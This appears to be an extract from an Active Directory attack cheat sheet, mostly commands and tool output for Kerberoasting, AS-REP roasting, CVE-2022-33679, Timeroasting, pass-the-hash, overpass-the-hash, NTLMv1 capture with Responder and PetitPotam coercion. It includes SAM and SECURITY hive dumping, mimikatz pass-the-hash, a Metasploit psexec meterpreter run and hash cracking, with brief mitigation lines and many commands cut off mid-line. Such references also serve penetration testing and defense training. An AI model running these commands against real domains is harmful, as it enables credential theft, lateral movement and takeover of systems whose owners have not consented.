+Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile
+# Kerberoast (AES ticket)
+# Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tic
+Rubeus.exe kerberoast /tgtdeleg
+# Kerberoast (RC4 ticket)
+# The tgtdeleg trick is used, and accounts without AES enabled are enumerated 
+Rubeus.exe kerberoast /rc4opsec
+./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.la
+# for each user without SPNs, it tries to set one (abuse of a write permission
+# print the "kerberoast" hash, and delete the temporary SPN set for that opera
+targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--req
+
+19700
+Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)
+Mitigations:
+Have a very long password for your accounts with SPNs (> 32 characters)
+Make sure no users have SPNs
+KRB_AS_REP Roasting
+If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be
+successfully requested for the user, and a component of the structure can be cracked
+offline a la kerberoasting
+Requirements:
+Accounts with the attribute DONT_REQ_PREAUTH ( PowerView > Get-DomainUser -
+PreauthNotRequired -Properties distinguishedname -Verbose )
+Rubeus
+GetNPUsers from Impacket Suite
+./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
+./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos
+C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:has
+[*] Action: AS-REP roasting
+[*] Target User            : TestOU3user
+[*] Target Domain          : testlab.local
+[*] SamAccountName         : TestOU3user
+[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,D
+[*] Using domain controller: testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 169 bytes
+[*] Received 1437 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+$krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)..
+$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
+
+CrackMapExec Module
+Using hashcat  or john  to crack the ticket.
+Mitigations:
+All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
+CVE-2022-33679
+CVE-2022-33679 performs an encryption downgrade attack by forcing the KDC to use the
+RC4-MD4 algorithm and then brute forcing the session key from the AS-REP using a known
+plaintext attack, Similar to AS-REP Roasting, it works against accounts that have pre-
+authentication disabled and the attack is unauthenticated meaning we don’t need a client’s
+password..
+Research from Project Zero : https://tinyurl.com/24hfcbgr
+Requirements:
+Accounts with the attribute DONT_REQ_PREAUTH ( PowerView > Get-DomainUser -
+PreauthNotRequired -Properties distinguishedname -Verbose )
+using CVE-2022-33679.py
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d0
+# extract hashes
+root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile us
+root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh
+$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 
+LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.L
+# crack AS_REP messages with hashcat
+root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast pass
+root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\ro
+# crack AS_REP messages with john
+C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproas
+user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
+
+Mitigations:
+All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
+Disable RC4 cipher if possible.
+Timeroasting
+Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing
+unauthenticated attackers to effectively request a password hash of any computer account
+by sending an NTP request with that account's RID
+SecuraBV/Timeroast - Timeroasting scripts by Tom Tervoort
+sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
+hashcat -m 31300 ntp-hashes.txt
+Pass-the-Hash
+The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows
+Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the
+built-in RID 500.
+Metasploit
+CrackMapExec
+Impacket suite
+user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
+user@hostname:~$ crackmapexec smb DC01.DOMAIN.LOCAL -k --shares
+use exploit/windows/smb/psexec
+set RHOST 10.2.0.3
+set SMBUser jarrieta
+set SMBPass nastyCutt3r  
+# NOTE1: The password can be replaced by a hash to execute a `pass the hash` a
+# NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b43
+set PAYLOAD windows/meterpreter/bind_tcp
+run
+shell
+cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09
+
+Windows RDP and mimikatz
+You can extract the local SAM database to find the local administrator hash :
+OverPass-the-Hash (pass the key)
+In this technique, instead of passing the hash directly, we use the NT hash of an account to
+request a valid Kerberost ticket (TGT).
+Using impacket
+Using Rubeus
+proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b97
+sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca
+sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm ha
+C:\> reg.exe save hklm\sam c:\temp\sam.save
+C:\> reg.exe save hklm\security c:\temp\security.save
+C:\> reg.exe save hklm\system c:\temp\system.save
+$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.rop
+root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
+root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park
+# also with the AES Key if you have it
+root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.
+root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -
+root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
+root@kali:~$ klist
+# Request a TGT as the target user and pass it into the current session
+# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to
+.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt
+# More stealthy variant, but requires the AES256 hash
+.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt
+
+Capturing and cracking Net-NTLMv1/NTLMv1 hashes
+Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a
+challenge/response algorithm and are based on the user's NT hash.
+:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected
+machine and downgrade the authentication to NetNTLMv1 Challenge/Response
+authentication. This uses the outdated encryption method DES to protect the NT/LM Hashes.
+Requirements:
+LmCompatibilityLevel = 0x1: Send LM & NTLM ( reg query
+HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel )
+Exploitation:
+Capturing using Responder: Edit the /etc/responder/Responder.conf  file to include the
+magical 1122334455667788 challenge
+Fire Responder: responder -I eth0 --lm , if --disable-ess  is set, extended session
+security will be disabled for NTLMv1 authentication
+Force a callback:
+If you got some NTLMv1 hashes , you need to format them to submit them on crack.sh
+username::hostname:response:response:challenge -> NTHASH:response
+NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
+Or crack them with Hashcat / John The Ripper
+# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the
+.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows
+HTTPS = On
+DNS = On
+LDAP = On
+...
+; Custom challenge.
+; Use "Random" for generating a random challenge for each requests (Default)
+Challenge = 1122334455667788
+PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
+PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-I
